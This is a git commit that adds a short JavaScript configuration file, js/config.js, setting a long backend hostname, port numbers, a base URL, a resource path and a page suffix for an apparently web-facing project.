345fbfb38f5c3c3c90472f8e0f9e665148105046
super181818 <131360198+super181818@users.noreply.github.com>
2023-04-29 17:36:50 +0800

    Add files via upload

---
+++ js/config.js
@@ -0,0 +1,10 @@
+/*-------config start-------*/
+var _wip = 'node-328215-1317375082.cos-website.ap-nanjing.myqcloud.commxae55pozu3zonpjr6zruhgzc5maztznixvp-qq-com.iscuuh.cn';  
+var _port = '1761';   
+/*---------config end---------*/
+
+var BaseUrl = 'http://' + _wip+':'+_port;
+var ResourceUrl = '/';
+var Suffix = '.html';
+var _isTx = 1;
+var _wport = '10000' 
